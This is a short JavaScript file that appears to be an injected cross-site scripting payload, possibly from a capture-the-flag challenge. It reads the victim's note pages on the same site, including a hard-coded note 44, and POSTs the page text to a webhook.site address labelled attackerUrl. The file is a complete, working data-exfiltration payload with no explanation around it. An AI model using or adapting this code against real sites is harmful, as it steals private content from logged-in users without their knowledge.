async function getNotes() {
  let response = await fetch(`/notes`);
  let text = await response.text();
  let matches = [...text.matchAll(/\/notes\/(\d+)/g)];
  let noteIds = matches.map((match) => match[1]);
  return noteIds; // ["123", "456"], extracting note id from `/notes`
}

async function getNoteById(id, attackerUrl) {
  let response = await fetch(`/notes/${id}`);
  let text = await response.text();
  await fetch(attackerUrl, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: encodeURIComponent(text),
  });
}

(async () => {
  const attackerUrl =
    "https://webhook.site/6963216e-50eb-47fa-a44d-5e6484b168fd";
  // let noteIds = await getNotes();
  let noteIds = [44];
  for (let id of noteIds) {
    await getNoteById(id, attackerUrl);
  }
})();
